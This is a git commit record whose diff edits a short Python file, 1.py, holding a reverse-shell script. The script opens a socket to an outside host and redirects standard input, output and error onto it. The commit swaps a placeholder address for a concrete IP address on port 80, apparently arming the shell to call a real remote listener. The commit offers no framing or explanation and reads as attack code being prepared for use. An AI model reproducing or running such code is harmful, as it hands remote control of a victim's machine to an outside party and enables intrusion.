9d6f27eadade8bf3574fd208f28586d1dd97bf80
40rg3t <95349558+40rg3t@users.noreply.github.com>
2022-06-23 07:50:24 -0400

    Update 1.py

--- 1.py
+++ 1.py
@@ -2,7 +2,7 @@
 
 import socket,subprocess,os,sys;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(('____',4445));
+s.connect(('133.125.33.19',80));
 os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
